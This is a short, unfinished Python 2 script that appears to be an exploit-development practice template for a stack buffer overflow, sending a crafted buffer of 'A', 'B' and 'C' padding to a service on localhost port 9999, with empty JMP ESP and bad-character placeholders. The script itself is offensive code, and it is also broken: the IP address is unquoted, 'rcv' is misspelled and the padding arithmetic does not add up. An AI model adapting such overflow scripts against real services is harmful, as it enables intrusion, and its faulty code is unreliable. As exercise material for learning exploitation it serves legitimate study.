#!/usr/bin/python

import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

#JMP ESP =

#bad_chars = 

buffer = 'A'*600 + 'B'*4 + 'C'*(600-524-4)

try:
  print '\nSending malicious buffer....()XXXXXX[{:::::::::>'
  s.connect((127.0.0.1,9999))
  data = s.rcv(1024)
  s.send(buffer + '\r\n')
  print '\n0verfl0wed'

except:
  print 'Could not connect to service'
  
